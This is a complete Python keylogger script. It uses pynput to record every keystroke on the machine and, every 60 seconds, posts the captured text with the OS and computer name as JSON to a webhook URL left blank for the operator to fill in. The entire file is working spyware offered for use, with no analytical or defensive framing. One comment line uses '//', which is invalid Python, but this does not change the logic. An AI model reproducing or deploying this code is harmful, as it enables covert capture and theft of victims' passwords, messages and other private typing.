from pynput import keyboard
import requests
import os
import json
import threading

text = ""
time_interval = 60
webhook_url = ''   // add the webhook url 
osname = os.name
pc = os.getenv('COMPUTERNAME')


def send_post_req():
    
    payload   = json.dumps({"os" : osname + pc , "keyboardData" : text})
    r = requests.post(webhook_url, data = payload , headers={'Content-Type': 'application/json'},timeout=5)
    timer = threading.Timer(time_interval, send_post_req)
    timer.start()


def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


with keyboard.Listener(on_press=on_press) as listener:     
    send_post_req()
    listener.join()
